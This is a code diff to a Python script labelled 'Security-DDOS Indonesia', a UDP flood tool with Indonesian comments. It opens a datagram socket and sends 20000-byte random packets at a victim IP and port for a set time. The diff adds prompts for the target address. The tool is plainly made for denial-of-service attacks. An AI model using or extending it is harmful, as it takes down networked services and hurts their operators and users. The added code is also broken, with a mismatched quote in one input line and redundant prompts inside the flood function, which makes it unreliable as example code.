@@ -2,6 +2,8 @@ import time
 import socket
 import random
 import sys
+import os
+
 def usage():
     print "\033[1;32m################################################"
     print "===========[\033[1;91mSecurity-DDOS Indonesia\033[1;32m]==========="
@@ -16,6 +18,8 @@ def flood(victim, vport, duration):
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 20000 representasi satu byte ke server
+    IP = input("IP Target = ")
+    Port = input(Port = ")
     bytes = random._urandom(20000)
     timeout =  time.time() + duration
     sent = 3000
